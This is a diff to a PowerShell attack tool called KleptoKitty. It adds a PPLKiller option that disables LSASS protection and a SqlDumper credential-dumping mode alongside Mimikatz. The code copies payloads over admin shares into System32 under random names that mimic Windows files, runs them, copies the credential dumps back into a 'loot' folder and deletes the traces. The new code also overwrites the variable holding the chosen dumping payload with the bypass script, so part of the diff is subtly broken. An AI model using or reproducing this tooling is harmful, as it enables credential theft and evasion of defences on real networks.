@@ -54,7 +54,7 @@
         but KleptoKitty will also support ProcDump or dual use tools like SqlDumper
 
 
-    .PARAMETER Evasion
+    .PARAMETER Bypass
 
         Defines if a bypass technique is used, for example to bypass LSA protection.
         Depending on the payload, the bypass technique may already be integrated
@@ -99,13 +99,13 @@
         [String]
         $Delivery = "Copy",
 
-        [ValidateSet("Demo","Mimikatz", "Mimikatz-mimidrv")]
+        [ValidateSet("Demo","Mimikatz", "Mimikatz-mimidrv", "SqlDumper")]
         [String]
         $CredentialAccess = "Demo",
 
-        [ValidateSet("Demo")]
+        [ValidateSet("PPLKiller")]
         [String]
-        $Evasion = "Demo",
+        $Bypass = "PPLKiller",
 
         [ValidateScript({Test-Path $_})]
         [String]
@@ -340,7 +340,7 @@
         )
 
         Switch($Type) {
-            "Log"   {$RandomName = "de_ch", "setupmod", "en_ir", "de_de", "Synaptics.MD", "fr_fr", "unso" | Get-Random; Break}
+            "Log"   {$RandomName = "de_ch", "setupmod", "en_ir", "Synaptics.MD", "fr_ch", "unso" | Get-Random; Break}
             Default {$RandomName = "AdmTmpl", "agentactivationruntimestarter", "CallHistoryClient", "EasPolicyManagerBrokerPS", "LockScreenData", "MsSpellCheckingFacility", "ReAgentTask" | Get-Random;}
         }
         
@@ -376,7 +376,15 @@
         "Demo"                { $PayloadNameCredentialAccess = "Write-Log.ps1"; Break}
         "Mimikatz"            { $PayloadNameCredentialAccess = "CredentialAccess-Mimikatz-Encrypted.ps1"; Break}
         "Mimikatz-mimidrv"    { $PayloadNameCredentialAccess = "CredentialAccess-Mimikatz-mimidrv-Encrypted.ps1"; Break}
+        "SqlDumper"           { $PayloadNameCredentialAccess = "CredentialAccess-SqlDumper.ps1"; Break}
         Default               { $PayloadNameCredentialAccess = "Write-Log.ps1"; Break}
+    }
+    $PayloadPathCredentialAccess = "$BasePath\payloads\$PayloadNameCredentialAccess"
+    $PayloadKeyCredentialAccess = "YourSecretKeyHere" # Use if the payload is encrypted
+
+    Switch ($Bypass) {        
+        "PPLKiller"           { $PayloadNameCredentialAccess = "Bypass-PPLKiller.ps1"; Break}        
+        Default               { $PayloadNameCredentialAccess = "Bypass-PPLKiller.ps1"; Break}
     }
     $PayloadPathCredentialAccess = "$BasePath\payloads\$PayloadNameCredentialAccess"
     $PayloadKeyCredentialAccess = "YourSecretKeyHere" # Use if the payload is encrypted    
@@ -429,8 +437,6 @@
         #
         # Settings per host
         #
-        $LogTargetName = "kleptokitty_$Hostname.log"
-        $LogTargetPath = "$basePath\$LogTargetName"
         $TargetShare = "\\$Hostname\c$"
 
         #
@@ -452,9 +458,41 @@
         }
 
         #
-        # Elevation - Actions based on payload
+        # Bypass - Actions based on payload
         #
-        If ($Evasion -eq "Demo") {
+        If ($Bypass -eq "PPLKiller") {
+
+            #
+            # Payload setting per host
+            #
+            $RandomName = Generate-RandomName -Type "Script"
+            $TargetBasePath = "Windows\System32"
+            $TargetPayloadName = "$RandomName.ps1"
+            $TargetPayloadPath = "$TargetShare\$TargetBasePath\$TargetPayloadName"
+            $TargetPayloadLocalPath = "C:\$TargetBasePath\$TargetPayloadName"
+
+            #
+            # Settings and actions are based on delivery method
+            # 
+            If ($Delivery -eq "Copy") {
+
+                # Copy Payload
+                Write-ProtocolEntry -Text "Copy payload $TargetPayloadName to $Hostname" -LogLevel "Info"                
+                $ResultCopyPayload = Copy-Payload -Source $PayloadPathCredentialAccess -Destination $TargetPayloadPath
+                If (-not($ResultCopyPayload)) { Continue }
+            }
+
+            # Execute Payload
+            Write-ProtocolEntry -Text "Execute payload on $Hostname" -LogLevel "Info"                
+            $PayloadCommandCredentialAccess = "$TargetPayloadLocalPath"
+            $ResultExecutePayload = Execute-Payload -PayloadCommand $PayloadCommandCredentialAccess
+            If ($ResultExecutePayload) {
+                Write-ProtocolEntry -Text "Payload $PayloadCredentialAccess executed, LSASS protection is (hopefully) disabled now." -LogLevel "Success"
+            }
+
+            # House Cleaning
+            Write-ProtocolEntry -Text "Delete payload on $Hostname" -LogLevel "Info"
+            Delete-File -File $TargetPayloadPath            
         }
 
         #
@@ -480,19 +518,19 @@
                 Write-ProtocolEntry -Text "Copy payload $TargetPayloadName to $Hostname" -LogLevel "Info"                
                 $ResultCopyPayload = Copy-Payload -Source $PayloadPathCredentialAccess -Destination $TargetPayloadPath
                 If (-not($ResultCopyPayload)) { Continue }
-
-                # Execute Payload
-                Write-ProtocolEntry -Text "Execute payload on $Hostname" -LogLevel "Info"                
-                $PayloadCommandCredentialAccess = "$TargetPayloadLocalPath"
-                $ResultExecutePayload = Execute-Payload -PayloadCommand $PayloadCommandCredentialAccess
-                If ($ResultExecutePayload) {
-                    Write-ProtocolEntry -Text "Payload $PayloadCredentialAccess executed." -LogLevel "Success"
-                }
-
-                # House Cleaning
-                Write-ProtocolEntry -Text "Delete payload on $Hostname" -LogLevel "Info"
-                Delete-File -File $TargetPayloadPath                
             }
+
+            # Execute Payload
+            Write-ProtocolEntry -Text "Execute payload on $Hostname" -LogLevel "Info"                
+            $PayloadCommandCredentialAccess = "$TargetPayloadLocalPath"
+            $ResultExecutePayload = Execute-Payload -PayloadCommand $PayloadCommandCredentialAccess
+            If ($ResultExecutePayload) {
+                Write-ProtocolEntry -Text "Payload $PayloadCredentialAccess executed." -LogLevel "Success"
+            }
+
+            # House Cleaning
+            Write-ProtocolEntry -Text "Delete payload on $Hostname" -LogLevel "Info"
+            Delete-File -File $TargetPayloadPath            
         }
         
         If ($CredentialAccess -eq "Mimikatz" -or $CredentialAccess -eq "Mimikatz-mimidrv") {
@@ -500,15 +538,16 @@
             #
             # Payload setting per host
             #
+            $DumpTargetName = $Hostname+"_mimikatz.log"
+            $DumpTargetPath = "$basePath\loot\$DumpTargetName"
             $RandomName = Generate-RandomName -Type "Script"
             $TargetBasePath = "Windows\System32"
             $TargetPayloadName = "$RandomName.ps1"
             $TargetPayloadPath = "$TargetShare\$TargetBasePath\$TargetPayloadName"
             $TargetPayloadLocalPath = "C:\$TargetBasePath\$TargetPayloadName"
-            $RandomName = "de-ch.log"
-            $TargetLogName = "$RandomName.log"
-            $TargetLogBasePath = "Windows"
-            $TargetLogPath = "$TargetShare\$TargetLogBasePath\$TargetLogName"
+            $TargetDumpName = "de-ch.log"
+            $TargetDumpBasePath = "Windows"
+            $TargetDumpPath = "$TargetShare\$TargetDumpBasePath\$TargetDumpName"
 
             #
             # Settings and actions are based on delivery method
@@ -536,13 +575,64 @@
 
             # Collect information from host
             Write-ProtocolEntry -Text "Retrieving log file" -LogLevel "Info"
-            $ResultCopyLog = Copy-Payload -Source $TargetLogPath -Destination $LogTargetPath
-            If (($ResultCopyLog)) { Write-ProtocolEntry -Text "Log file $LogTargetName saved." -LogLevel "Success" }
+            $ResultCopyDump = Copy-Payload -Source $TargetDumpPath -Destination $DumpTargetPath
+            If (($ResultCopyDump)) { Write-ProtocolEntry -Text "Log file $DumpTargetName saved." -LogLevel "Success" }
 
             # House Cleaning
             Write-ProtocolEntry -Text "Delete payload and logs on $Hostname" -LogLevel "Info"
             Delete-File -File $TargetPayloadPath
-            Delete-File -File $TargetLogPath            
+            Delete-File -File $TargetDumpPath            
+        }
+
+        If ($CredentialAccess -eq "SqlDumper") {
+
+            #
+            # Payload setting per host
+            #
+            $DumpTargetName = $Hostname+"_sqldumper.mdmp"
+            $DumpTargetPath = "$basePath\loot\$DumpTargetName"
+            $RandomName = Generate-RandomName -Type "Script"
+            $TargetBasePath = "Windows\System32"
+            $TargetPayloadName = "$RandomName.ps1"
+            $TargetPayloadPath = "$TargetShare\$TargetBasePath\$TargetPayloadName"
+            $TargetPayloadLocalPath = "C:\$TargetBasePath\$TargetPayloadName"
+            $TargetDumpName = "SQLDmpr0001.mdmp"
+            $TargetDumpBasePath = "Windows\System32"
+            $TargetDumpPath = "$TargetShare\$TargetDumpBasePath\$TargetDumpName"
+
+            #
+            # Settings and actions are based on delivery method
+            # 
+            If ($Delivery -eq "Copy") {
+
+                # Copy payload
+                Write-ProtocolEntry -Text "Copy payload $TargetPayloadName to $Hostname" -LogLevel "Info"                
+                $ResultCopyPayload = Copy-Payload -Source $PayloadPathCredentialAccess -Destination $TargetPayloadPath
+                If (-not($ResultCopyPayload)) { Continue }
+            }
+
+            # Execute payload
+            Write-ProtocolEntry -Text "Execute payload on $Hostname" -LogLevel "Info"
+            $PayloadCommandCredentialAccess = "$TargetPayloadLocalPath"
+            $ResultExecutePayload = Execute-Payload -PayloadCommand $PayloadCommandCredentialAccess
+            If ($ResultExecutePayload) {
+                Write-ProtocolEntry -Text "Payload $PayloadCredentialAccess executed." -LogLevel "Success"
+            }
+
+            # Good things come to those who wait
+            $SleepTime = 30
+            Write-ProtocolEntry -Text "Let SqlDumper finish. Waiting for $SleepTime seconds!" -LogLevel "Debug"
+            Start-Sleep -Seconds $SleepTime
+
+            # Collect information from host
+            Write-ProtocolEntry -Text "Retrieving dump file" -LogLevel "Info"
+            $ResultCopyDump = Copy-Payload -Source $TargetDumpPath -Destination $DumpTargetPath
+            If (($ResultCopyDump)) { Write-ProtocolEntry -Text "Dump file $DumpTargetName saved." -LogLevel "Success" }
+
+            # House Cleaning
+            Write-ProtocolEntry -Text "Delete payload and dump file on $Hostname" -LogLevel "Info"
+            Delete-File -File $TargetPayloadPath
+            Delete-File -File $TargetDumpPath            
         }
 
         #
